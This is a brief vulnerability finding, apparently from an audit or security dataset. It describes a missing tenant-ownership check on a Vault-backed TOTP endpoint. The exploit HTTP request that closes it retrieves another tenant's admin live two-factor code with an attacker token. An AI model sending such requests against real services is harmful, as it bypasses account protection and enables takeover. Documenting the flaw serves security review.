diagnosis: The TOTP generation endpoint calls Vault's TOTP secrets engine to retrieve the active 2FA OTP code for key_name supplied in the path. It authenticates the caller but omits validating that key_name belongs to user.id or user.tenant_id. An attacker can retrieve live two-factor authentication codes for admin accounts of other tenants.
exploit_request:
GET /security/totp/totp_admin_acme_corp/current-code HTTP/1.1
Host: auth-gateway.cloud.io
Authorization: Bearer <attacker_jwt>
